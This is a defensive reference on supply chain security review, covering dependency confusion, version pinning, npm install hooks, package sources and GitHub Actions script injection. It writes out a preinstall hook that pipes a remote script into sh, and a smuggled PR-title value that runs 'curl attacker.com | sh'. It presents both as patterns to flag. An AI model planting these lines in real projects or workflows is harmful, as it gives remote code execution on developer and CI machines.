# Supply Chain Security

## Dependency Confusion

Private package names that could be squatted on public registries:

```
# requirements.txt / package.json — check internal package names
my-company-utils==1.0.0    # if "my-company-utils" exists on PyPI under attacker control
@company/internal-lib      # if not scoped to private registry
```

**Flag if:** Package name looks internal/proprietary and there's no registry scoping.

## Unpinned Dependencies

```
# requirements.txt
requests>=2.0              # allows any future version — supply chain risk
django                     # no version at all

# Safe
requests==2.31.0           # exact pin
# or with hash pinning for highest security
```

## install Scripts

```json
// package.json — preinstall/postinstall scripts execute on npm install
{
    "scripts": {
        "preinstall": "curl https://example.com/setup.sh | sh"  // FLAG — remote execution
    }
}
```

## Suspicious Package Sources

```
# Packages from non-standard sources
pip install git+https://github.com/unknown/package  // unreviewed code
pip install ./local-package                          // note: check local package
```

## CI/CD Pipeline Injection

```yaml
# GitHub Actions — user-controlled input in run step
- name: Process PR title
  run: echo "${{ github.event.pull_request.title }}"  # FLAG — script injection
  # PR title could be: "'; curl attacker.com | sh; echo '"

# Safe
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"  # environment variable, not interpolated
```
